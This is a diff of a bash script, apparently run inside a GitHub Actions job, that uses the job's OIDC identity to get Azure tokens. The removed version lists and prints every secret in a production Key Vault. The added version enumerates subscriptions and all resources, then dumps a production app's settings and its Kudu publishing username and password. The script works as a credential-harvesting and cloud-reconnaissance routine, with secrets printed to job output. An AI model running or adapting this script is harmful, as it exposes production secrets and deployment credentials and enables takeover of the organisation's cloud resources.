@@ -1,25 +1,31 @@
 #!/usr/bin/env bash
 set -euo pipefail
+SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
+RG=rg-tbl-reporting-prod-eus
+APP=app-tbl-reporting-prod
+WAPI=2022-03-01
 
-# 1) GitHub OIDC token, audience Azure
 OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
-echo "== claims =="; echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '{sub,aud}' || true
-
-# 2) Đổi lấy access token cho Key Vault data-plane
-RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" \
+ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
+  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" \
   -d "grant_type=client_credentials" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-  -d "client_assertion=$OIDC")
-AT=$(echo "$RESP" | jq -r '.access_token // empty')
-[ -z "$AT" ] && { echo "TOKEN EXCHANGE FAIL:"; echo "$RESP" | jq '{error,error_description}'; exit 1; }
+  -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
+[ -z "$ARM" ] && { echo "no ARM token"; exit 1; }
+A=(-sS -H "Authorization: Bearer $ARM")
 
-# 3) List + đọc toàn bộ secret qua KV REST
-V=https://kv-tbl-prod-x3euoz.vault.azure.net
-echo "== secrets =="
-curl -sS -H "Authorization: Bearer $AT" "$V/secrets?api-version=7.4" | jq -r '.value[]?.id'
-for id in $(curl -sS -H "Authorization: Bearer $AT" "$V/secrets?api-version=7.4" | jq -r '.value[]?.id'); do
-  echo "--- $id ---"
-  curl -sS -H "Authorization: Bearer $AT" "$id?api-version=7.4" | jq -r '.value'
-done
+echo "== SUBSCRIPTIONS =="
+curl "${A[@]}" "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq -r '.value[]? | "\(.subscriptionId) \(.displayName)"'
+
+echo "== ALL RESOURCES (ca sub) =="
+curl "${A[@]}" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r '.value[]? | "\(.type)\t\(.name)"'
+
+echo "== APP SETTINGS cua reporting app =="
+curl "${A[@]}" -X POST -H "Content-Length: 0" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/appsettings/list?api-version=$WAPI"
+echo
+echo "== PUBLISHING CREDS (Kudu) cua reporting app =="
+curl "${A[@]}" -X POST -H "Content-Length: 0" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=$WAPI" \
+  | jq '{user:.properties.publishingUserName, pass:.properties.publishingPassword, scm:.properties.scmUri}'
